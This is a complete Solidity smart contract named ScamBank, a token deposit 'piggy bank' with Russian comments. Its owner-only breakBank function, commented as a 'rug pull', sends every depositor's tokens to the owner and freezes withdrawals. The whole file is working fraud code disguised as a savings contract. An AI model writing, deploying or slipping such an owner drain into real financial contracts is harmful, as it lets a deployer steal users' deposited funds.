pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ScamBank {

    IERC20 public immutable token;
    mapping(address => uint256) public balances;
    address public owner;
    bool public broken;

    event Deposited(address indexed who, uint256 amount);
    event Withdrawn(address indexed who, uint256 amount);
    event Broken(address indexed by, uint256 totalAmount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notBroken() {
        require(!broken, "Piggy bank is broken");
        _;
    }

    constructor(address _tokenAddress) {
        require(_tokenAddress != address(0), "Zero token address");
        owner = msg.sender;
        token = IERC20(_tokenAddress);
    }

    // Депозит токенов. Перед вызовом нужен token.approve(address(this), amount)
    function deposit(uint256 amount) external notBroken {
        require(amount > 0, "Deposit some tokens");
        balances[msg.sender] += amount;
        token.transferFrom(msg.sender, address(this), amount);
        emit Deposited(msg.sender, amount);
    }

    // Снять часть токенов
    function withdraw(uint256 amount) external notBroken {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
        emit Withdrawn(msg.sender, amount);
    }

    // Вывести все токены на счёт владельца (rug pull)
    function breakBank() external onlyOwner notBroken {
        broken = true;
        uint256 total = token.balanceOf(address(this));
        token.transfer(owner, total);
        emit Broken(owner, total);
    }

    function getContractBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}